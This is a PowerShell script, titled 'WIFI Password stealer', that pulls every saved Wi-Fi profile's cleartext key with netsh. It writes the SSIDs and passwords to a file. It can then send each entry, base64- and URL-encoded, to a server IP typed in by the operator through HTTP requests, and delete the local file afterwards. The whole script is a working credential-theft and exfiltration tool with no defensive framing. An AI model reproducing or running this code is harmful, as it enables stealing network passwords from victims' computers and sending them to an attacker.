echo "#######################################"
echo "#                                     #"
echo "#      WIFI Password stealer          #"
echo "#                                     #"
echo "#######################################"
# Check if file already exists

function RemoteServer {
    $server = $args[0]
    Add-Type -AssemblyName System.Web
    foreach($line in Get-Content .\WIFI_Passwords.txt) {
        $Bytes = [System.Text.Encoding]::Unicode.GetBytes($line)
        $EncodedBase64 =[Convert]::ToBase64String($Bytes)
        $EncodedURL = [System.Web.HttpUtility]::UrlEncode($EncodedBase64)
        try {
            $WebResonse = Invoke-WebRequest -URI "http://$($server)/$($EncodedURL)"
            echo "Response Code --> $($WebResonse.StatusCode)"
        } catch {
            echo "Server might be down, trying to send next password"
            continue
        }
    }
}

if (test-path ".\WIFI_Passwords.txt") {
    Write-Host "File found!, Please delete WIFI_Passwords.txt to continue"
    Read-Host -Prompt "Press Enter to exit"
    exit
}
else
{
    Write-Host "FILE NOT FOUND! Exctracting passwords"
}

# Check for Known WIFI SSID
$WIFI_list = netsh wlan show profiles | Select-String -Pattern ': '
$WIFI_list > WIFI.txt
echo $WIFI_list

# Store the Information on File called WIFI.txt
$FilePath = ".\WIFI.txt"
$WifiPasswordFile = ".\WIFI_Passwords.txt"
( Get-Content $FilePath ) | Where { $_ } | Set-Content $FilePath

# Create file for passwords
New-Item WIFI_Passwords.txt -type file

# Loop for each SSID and check the password, then store it into file called WIFI_Passwords.txt
foreach($line in Get-Content .\WIFI.txt) {
    # Create Vriable contains the name of the wifi
    $wifi_name =  $line.replace("    All User Profile     : ", "")

    # Check if Security Key Presents or not
    $check = netsh wlan show profile $wifi_name key=clear | Select-String -Pattern 'Security key'
    $check = $check -replace '(?m)^\s*?\n'
    $check = $check.Replace("    Security key           : ", "")
    
    if ($check -eq "Present") {
        $password = netsh wlan show profile $wifi_name key=clear | Select-String -Pattern 'Key Content'
        $password = $password -replace '(?m)^\s*?\n'
        $password = $password.Replace("    Key Content            : ", "")
        echo "$($wifi_name) ----> $($password)" >> WIFI_Passwords.txt
    } else {
        echo "$($wifi_name) ----> " >> WIFI_Passwords.txt
    }
}

del $FilePath
$Reponse = Read-Host -Prompt "Would you like to send password to remote server? (yes/no)"

if ($Reponse -eq "yes") {
    $server = Read-Host -Prompt "Enter server IP"
    RemoteServer $server
    del $WifiPasswordFile
}
else {
    echo "Passwords store in file called WIFI_Passwords.txt"
}
